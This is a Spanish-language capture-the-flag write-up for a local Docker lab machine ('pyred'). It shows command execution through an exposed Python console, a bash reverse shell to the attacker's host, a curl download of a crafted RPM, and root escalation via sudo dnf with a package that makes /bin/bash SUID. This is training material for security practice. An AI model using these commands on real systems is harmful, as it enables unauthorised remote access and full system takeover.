Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh pyred.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
<ins>La dirección IP de la máquina a vulnerar siempre es la 172.17.0.2</ins>.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/39f9d17d-537d-489e-b600-8412d3d2d98f)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/3d97d0e9-cd78-4155-9c4e-e5ec9d73329e)

Podemos ver que se encuentra abierto únicamente el puerto ***5000***, correspondiente al servicio ***UPnP*** (Universal Plug and Play).

Vamos a intentar atacar a la máquina víctima mediante UPnP. Para ello, nos podemos dirigir al navegador y en el buscador ponemos http://172.17.0.2:5000.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/ef642a79-9d33-4210-8df9-88110271133c)

Se nos muestra una consola de Python en la que podemos probar comandos y también aparece la salida (output) correspondiente a la ejecución de los comandos que escribamos.
Vamos a escribir por ejemplo, los siguientes comandos y ver que nos devuelve el output:

**import os
print(os.system("id"))**

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/ba46fab3-2643-43c5-9466-e9d487630723)

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/4d8f86f1-8679-4992-8f08-7dd832e1c48a)

La salida nos muestra que somos el usuario "primpi" cuyo ID es el 1000. Probamos a hacer un pwd para saber el directorio en el que nos encontramos o un ls para listar el contenido del directorio:

**import os
print(os.system("pwd"))**

**import os
print(os.system("ls -l"))**

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/bd1968be-deaa-49bb-b5b6-33d419632be2)

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/ea00f12c-bfaf-4f7d-b2f6-e99561c3308d)

Viendo que podemos ejecutar cualquier comando correspondiente al sistema gracias a la librería de Python OS, vamos a ejecutar una reverse shell en esta consola y ejecutarlo.
Para ello, utilizamos la página [https://www.revshells.com/](https://www.revshells.com/) que nos ayudará a generar la línea de código que tenemos que poner.

**import os
print(os.system("sh -i >& /dev/tcp/172.16.36.24/443 0>&1"))**

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/01cadc37-7a8b-441e-a382-7a14cff5d2a2)

Nos ponemos en escucha por el puerto 443 y ejecutamos el código que hemos insertado en la CLI virtual.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/d7f469fa-098d-4205-a2ac-6570ad9356c5)

Si todo ha ido bien, nos aparecerá una sesión nueva iniciada tras ejecutar la reverse shell.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/9d39e4e4-2757-42a6-ba53-72be8a730680)

Miramos en que directorio nos encontramos y con qué usuario hemos logrado acceder.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/c210d46f-92d9-49db-b076-4aa4ab3e4d16)

Aparentemente, somos el usuario "primpi" y estamos en el directorio raíz (**/**) del sistema. Investigamos si podemos realizar una escalada de privilegios usando este usuario para acceder como "root".

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/f27c9e52-b91e-46da-996b-08541a9512bc)

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/204e75ee-8d02-44b5-b8db-1da29c63e557)

Buscamos en [https://gtfobins.github.io/](https://gtfobins.github.io/) la sección correspondiente a "***dnf***" e introducimos los comandos que nos pone en la terminal de nuestra máquina Kali atacante.

**TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF**

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/29c58322-2b89-45d4-8230-03fd01b7ba8d)

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/25c3d50e-6526-48a1-a257-3df5bf8962b4)

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/78fb179d-528c-4d4c-8809-35833efc9714)

Compartimos el archivo mediante HTTP.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/2d2d4a22-fdd9-4357-9565-fdd68d0cfecf)

Hacemos un curl desde la máquina víctima para obtener el .rpm que hemos creado poniendo **curl** [***IP de la máquina atacante***]**/x-1.0-1.noarch.rpm -o** [***Nombre programa***].
En mi caso, yo pongo curl 172.17.0.1/x-1.0-1.noarch.rpm -o virus.rpm --> el nombre virus.rpm es para que sea fácil de reconocer a la hora de buscarlo o hacer un listado

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/eceb6f24-0376-41f3-a688-be0024e176ce)

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/e4f8785d-5659-4681-9782-f159541df568)

Escribimos el comando **sudo -u root /usr/bin/dnf install -y virus.rpm**. Esto lo que va a hacer es que como el usuario "primpi" tiene privilegios para acceder a /usr/bin/dnf sin necesidad de ingresar contraseña, iniciamos en la consola pero en lugar de acceder como el usuario primpi, accedemos con el usuario root, por lo que tendremos todos los permisos y privilegios posibles dentro de la máquina víctima.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/8a6bd089-9759-46b6-8977-f2b6bd077618)

Comprobamos que somos realmente el usuario root:

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/43cdf7f6-cb14-4c26-856d-c45dcc707295)

<ins>**La escalada de privilegios ha funcionado correctamente. Somos el usuario "root"**</ins>.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/ca5259c6-5e03-4edd-9d4d-3eb935510bb7)
